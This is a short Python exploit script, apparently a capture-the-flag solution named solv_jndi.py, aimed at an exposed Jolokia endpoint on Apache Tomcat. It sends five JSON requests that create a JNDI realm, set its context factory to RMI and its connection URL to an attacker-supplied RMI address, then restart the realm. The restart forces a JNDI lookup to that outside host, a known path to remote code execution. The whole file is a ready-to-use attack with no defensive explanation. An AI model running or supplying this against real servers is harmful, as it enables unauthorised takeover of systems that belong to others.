import requests as req
import sys

if len(sys.argv) < 3:
    print("python3 solv_jndi.py <url> <rmi>")
    exit()

url = sys.argv[1] + "/jolokia/"

# JNDIRealm
create_JNDIrealm = {
    "mbean": "Catalina:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Catalina:type=Engine"]
}

# contextFactory
set_contextFactory = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}
# connectionURL to call RMI service
set_connectionURL = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": sys.argv[2]
}
# Realm stop
stop_JNDIrealm = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}
# Realm start
start = {
    "mbean": "Catalina:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]

for i in expoloit:
    rep = req.post(url, json=i)